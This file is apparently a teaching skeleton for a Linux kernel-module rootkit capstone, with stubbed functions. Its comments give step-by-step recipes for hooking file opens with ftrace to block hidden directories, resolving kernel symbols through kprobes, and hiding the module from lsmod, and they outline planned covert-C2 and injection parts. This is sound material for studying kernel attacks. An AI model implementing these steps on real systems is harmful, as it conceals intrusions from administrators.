/*
 * rootkit.c — LKM rootkit main module
 *
 * Capstone: Kernel Rootkit + Exploitation
 *
 * This is the main module file. It handles:
 *   - File access blocking via ftrace hook on do_sys_openat2
 *   - Module self-hiding via list_del_init
 *   - Orchestrates init/exit of all subsystems
 *
 * Other components plug in as separate compilation units:
 *   - File hiding (file_hide.c) — getdents64 kretprobe for rk_ prefix
 *   - Process hiding (proc_hide.c) — getdents64 kretprobe for /proc by GID 1337
 *   - Covert C2 (c2.c) — kill() kprobe with extended protocol (x2-x7)
 *   - Shellcode injection (inject.c) — process memory manipulation
 *
 * Reference modules:
 *   - bouncer_ftrace.c — ftrace blocking pattern
 *   - ghostmod.c — module hiding pattern
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>

#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Capstone: LKM rootkit — file hiding, process hiding, access blocking, self-concealment, covert C2, injection");

/* ═══════════════════════════════════════════════════════════════════════════
 * File access blocking — ftrace hook on do_sys_openat2
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * TODO: Implement kprobe_lookup()
 *
 * Resolve a kernel symbol address using the kprobe registration trick.
 * This works because register_kprobe() internally calls kallsyms_lookup_name()
 * and stores the result in kp.addr.
 *
 * Steps:
 * 1. struct kprobe kp = { .symbol_name = name };
 * 2. register_kprobe(&kp) — resolves the symbol
 * 3. Save kp.addr
 * 4. unregister_kprobe(&kp)
 * 5. Return the address (cast to unsigned long)
 *
 * Reference: bouncer_ftrace.c kprobe_lookup()
 */

/*
 * TODO: Implement rootkit_openat_callback()
 *
 * Ftrace callback for do_sys_openat2. Checks if the file being opened
 * falls under HIDDEN_DIR_1 or HIDDEN_DIR_2 and blocks access by zeroing
 * the filename pointer (causes -EFAULT).
 *
 * Steps:
 * 1. Extract filename: ftrace_regs_get_argument(fregs, 1)
 *    — no double pt_regs! do_sys_openat2 is an inner function
 * 2. Allocate kernel buffer: kmalloc(MAX_PATH_LEN, GFP_ATOMIC)
 *    — must use GFP_ATOMIC in ftrace context
 * 3. Copy from userspace: strncpy_from_user(kbuf, user_path, MAX_PATH_LEN)
 * 4. Check if kbuf starts with HIDDEN_DIR_1 or HIDDEN_DIR_2
 *    — use strncmp(kbuf, HIDDEN_DIR_1, strlen(HIDDEN_DIR_1)) == 0
 *    — prefix match: blocks /tmp/secret, /tmp/secret/foo, etc.
 * 5. If match: set fregs->regs[1] = 0 to cause -EFAULT
 *    and log with pr_info("rootkit: blocked access to %s by %s[%d]\n", ...)
 * 6. kfree the buffer
 *
 * Function signature:
 *   static void notrace rootkit_openat_callback(unsigned long ip,
 *       unsigned long parent_ip, struct ftrace_ops *op,
 *       struct ftrace_regs *fregs)
 *
 * IMPORTANT: Mark this function 'notrace' to prevent recursive ftrace calls.
 */

/* TODO: Define ftrace_ops struct
 *
 * static struct ftrace_ops rootkit_ops = {
 *     .func  = rootkit_openat_callback,
 *     .flags = FTRACE_OPS_FL_IPMODIFY | FTRACE_OPS_FL_RECURSION,
 * };
 */

static unsigned long target_func_addr;
bool blocking_active;

/*
 * TODO: Implement blocking_init()
 *
 * Three-step ftrace setup:
 * 1. target_func_addr = kprobe_lookup("do_sys_openat2")
 * 2. ftrace_set_filter_ip(&rootkit_ops, target_func_addr, 0, 0)
 * 3. register_ftrace_function(&rootkit_ops)
 * 4. Set blocking_active = true
 *
 * Return 0 on success, negative errno on failure.
 * Use goto-based error unwinding.
 */
int blocking_init(void)
{
	/* TODO */
	return -ENOSYS;
}

/*
 * TODO: Implement blocking_exit()
 *
 * Two-step ftrace teardown:
 * 1. unregister_ftrace_function(&rootkit_ops)
 * 2. ftrace_set_filter_ip(&rootkit_ops, target_func_addr, 1, 0)
 *    (the 1 = remove filter)
 * 3. Set blocking_active = false
 */
void blocking_exit(void)
{
	/* TODO */
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Module self-hiding
 * ═══════════════════════════════════════════════════════════════════════════ */

static bool module_hidden;
static struct list_head *saved_prev;

/*
 * TODO: Implement hide_module()
 *
 * 1. If already hidden, return
 * 2. Save: saved_prev = THIS_MODULE->list.prev
 * 3. Remove: list_del_init(&THIS_MODULE->list)
 * 4. Set module_hidden = true
 * 5. Log with pr_info
 *
 * After this: lsmod and /proc/modules won't show the module.
 * But: /sys/module/rootkit/ still exists (separate kobject).
 * And: rmmod rootkit still works (uses hash table, not list).
 *
 * Reference: ghostmod.c set_hidden()
 */
void hide_module(void)
{
	/* TODO */
}

/*
 * TODO: Implement show_module()
 *
 * 1. If not hidden, return
 * 2. Restore: list_add(&THIS_MODULE->list, saved_prev)
 * 3. Set module_hidden = false
 * 4. Log with pr_info
 */
void show_module(void)
{
	/* TODO */
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Module init / exit
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * TODO: Implement rootkit_init()
 *
 * Initialize all subsystems with goto-based error unwinding:
 * 1. c2_init() — register kprobe on kill() for covert C2
 * 2. inject_init() — initialize injection subsystem
 * 3. file_hide_init() — register kretprobe for file hiding
 * 4. proc_hide_init() — register kretprobe for process hiding
 * 5. blocking_init() — register ftrace hook for access blocking
 * 6. hide_module() — remove module from list
 * 7. Log success with pr_info
 *
 * If any step fails, unwind all previous steps and return the error.
 */
static int __init rootkit_init(void)
{
	pr_info("rootkit: initializing\n");
	/* TODO */
	return -ENOSYS;
}

/*
 * TODO: Implement rootkit_exit()
 *
 * Reverse teardown — unhide first so lsmod works during debugging:
 * 1. show_module() — re-add to module list (safe even if not hidden)
 * 2. blocking_exit() — unregister ftrace hook
 * 3. proc_hide_exit() — unregister proc hiding kretprobe
 * 4. file_hide_exit() — unregister file hiding kretprobe
 * 5. inject_exit() — clean up injection subsystem
 * 6. c2_exit() — unregister kprobe on kill()
 * 7. Log with pr_info
 */
static void __exit rootkit_exit(void)
{
	pr_info("rootkit: cleaning up\n");
	/* TODO */
}

module_init(rootkit_init);
module_exit(rootkit_exit);
